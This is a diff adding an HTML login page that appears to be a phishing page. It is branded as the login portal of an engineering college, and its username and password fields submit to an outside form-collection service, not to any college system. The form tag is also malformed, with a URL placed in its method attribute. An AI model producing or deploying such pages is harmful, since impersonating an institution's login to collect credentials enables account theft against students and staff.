@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login Portal</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:linear-gradient(135deg,#8b0000,#b71c1c,#d32f2f);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    background:#fff;
+    width:380px;
+    padding:35px;
+    border-radius:15px;
+    box-shadow:0 10px 30px rgba(0,0,0,.3);
+    text-align:center;
+}
+
+.logo{
+    width:140px;
+    margin-bottom:15px;
+}
+
+h2{
+    color:#8b0000;
+    margin-bottom:5px;
+}
+
+p{
+    color:#666;
+    font-size:14px;
+    margin-bottom:25px;
+}
+
+.input-box{
+    width:100%;
+    margin-bottom:18px;
+}
+
+.input-box input{
+    width:100%;
+    padding:13px;
+    border:1px solid #ccc;
+    border-radius:8px;
+    font-size:15px;
+    outline:none;
+    transition:.3s;
+}
+
+.input-box input:focus{
+    border-color:#b71c1c;
+}
+
+button{
+    width:100%;
+    padding:13px;
+    border:none;
+    border-radius:8px;
+    background:#b71c1c;
+    color:white;
+    font-size:17px;
+    cursor:pointer;
+    transition:.3s;
+}
+
+button:hover{
+    background:#8b0000;
+}
+
+.footer{
+    margin-top:20px;
+    color:#777;
+    font-size:12px;
+}
+</style>
+
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Replace logo.png with your uploaded logo filename -->
+    <img src="logo.png" class="logo" alt="College Logo">
+
+    <h2>Login Portal</h2>
+
+    <p>Enter your credentials to continue</p>
+
+    <form action="https://forminit.com/thank-you" method="https://forminit.com/f/uaxespqp7qo">
+
+        <div class="input-box">
+            <input
+                type="text"
+                name="username"
+                placeholder="Username / Email"
+                required>
+        </div>
+
+        <div class="input-box">
+            <input
+                type="password"
+                name="password"
+                placeholder="Pw"
+                required>
+        </div>
+
+        <button type="submit">Login</button>
+
+    </form>
+
+    <div class="footer">
+        Adhiparasakthi Engineering College
+    </div>
+
+</div>
+
+</body>
+</html>
